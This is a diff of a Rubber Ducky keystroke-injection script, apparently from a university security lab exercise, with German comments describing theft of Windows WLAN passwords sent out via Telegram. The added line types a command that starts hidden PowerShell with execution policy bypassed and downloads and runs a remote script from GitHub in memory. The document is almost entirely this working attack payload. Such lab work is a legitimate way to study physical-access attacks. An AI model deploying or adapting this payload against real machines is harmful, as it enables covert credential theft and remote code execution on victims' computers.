@@ -1,20 +1,13 @@
 REM ============================================================
-REM  W02a.6 – Rubber Ducky: Eigener Angriff – WLAN-Exfiltration
+REM  W02a.6 – Rubber Ducky: WLAN-Passwörter exfiltrieren
 REM  Autoren: Raphael Bleier, Joachim Lugger
 REM  Ziel-OS: Windows
 REM
-REM  Lädt custom_attack.ps1 von einem öffentlichen GitHub Gist.
-REM  Exfiltration der WLAN-Passwörter als privates GitHub Gist.
-REM  Kein lokaler Server, funktioniert über alle Subnetze.
-REM
-REM  Setup:
-REM    1. GITHUB_PAT in custom_attack.ps1 eintragen
-REM    2. custom_attack.ps1 als öffentliches Gist hochladen
-REM    3. GIST_RAW_URL unten ersetzen
+REM  Lädt custom_attack.ps1 direkt von GitHub (fileless).
+REM  WLAN-Passwörter kommen per Telegram als Datei.
 REM ============================================================
 
 DELAY 2000
-
 GUI r
 DELAY 500
-STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('GIST_RAW_URL');"
+STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/custom_attack.ps1');"
